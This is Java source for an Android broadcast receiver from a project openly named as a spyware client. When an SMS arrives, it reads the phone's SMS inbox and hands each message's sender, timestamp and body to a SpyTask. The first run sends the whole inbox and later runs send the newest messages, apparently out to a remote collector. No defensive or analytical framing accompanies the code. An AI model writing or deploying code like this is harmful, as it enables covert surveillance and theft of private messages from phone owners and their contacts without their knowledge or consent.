package com.hoangdv.spywareclient.Spy;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.SystemClock;
import android.util.Log;

public class SpywareSmsReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		SharedPreferentceHelper.getConfig(context);
		
		if (isConnectInternet(context)) {
			if (!StatusConfig.sendAll) {
				postAllSmsInbox(context);
				StatusConfig.sendAll = true;
			} else if (StatusConfig.smsToSend == 0) {// Chi gui tin nhan vua
														// nhan
				postSmsInbox(context, 1);
			} else {
				postSmsInbox(context, StatusConfig.smsToSend + 1);
				StatusConfig.smsToSend = 0;
			}
			if(!StatusConfig.sendInfoDevice){
				//Gui thong tin devices
			}
		} else {
			StatusConfig.smsToSend += 1;
		}
		
		SharedPreferentceHelper.saveConfig(context);
	}

	private boolean isConnectInternet(Context context) {
		ConnectivityManager cManager = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		if (cManager != null) {
			NetworkInfo[] infos = cManager.getAllNetworkInfo();
			if (infos != null) {
				for (NetworkInfo i : infos) {
					if (i.getState() == NetworkInfo.State.CONNECTED) {
						return true;
					}
				}
			}
		}
		return false;
	}

	private void postSmsInbox(Context context, int count) {
		ContentResolver contentResolver = context.getContentResolver();
		Cursor cursor = contentResolver.query(Uri.parse("content://sms/inbox"),
				null, null, null, null);
		int indexPhoneNumber = cursor.getColumnIndex("address");
		int indexTimeStamp = cursor.getColumnIndex("date");
		int indexBody = cursor.getColumnIndex("body");
		if (indexBody < 0 || !cursor.moveToFirst())
			return;
		for (int i = 0; i < count; i++) {
			String phoneNumber = cursor.getString(indexPhoneNumber);
			String timeStamp = cursor.getString(indexTimeStamp);
			String body = cursor.getString(indexBody);
			SmsInfo smsInfo = new SmsInfo(phoneNumber, timeStamp, body);

			Log.d("Message", phoneNumber + ":" + timeStamp + ":" + body);
			SpyTask task = new SpyTask();
			task.execute(smsInfo);
			SystemClock.sleep(60);
			if (!cursor.moveToNext())
				break;
		}
	}

	private void postAllSmsInbox(Context context) {
		ContentResolver contentResolver = context.getContentResolver();
		Cursor cursor = contentResolver.query(Uri.parse("content://sms/inbox"),
				null, null, null, null);
		int indexPhoneNumber = cursor.getColumnIndex("address");
		int indexTimeStamp = cursor.getColumnIndex("date");
		int indexBody = cursor.getColumnIndex("body");
		if (indexBody < 0 || !cursor.moveToFirst())
			return;
		do {
			String phoneNumber = cursor.getString(indexPhoneNumber);
			String timeStamp = cursor.getString(indexTimeStamp);
			String body = cursor.getString(indexBody);
			SmsInfo smsInfo = new SmsInfo(phoneNumber, timeStamp, body);

			Log.d("Message", phoneNumber + ":" + timeStamp + ":" + body);
			SpyTask task = new SpyTask();
			task.execute(smsInfo);
			SystemClock.sleep(60);
		} while (cursor.moveToNext());
	}
}
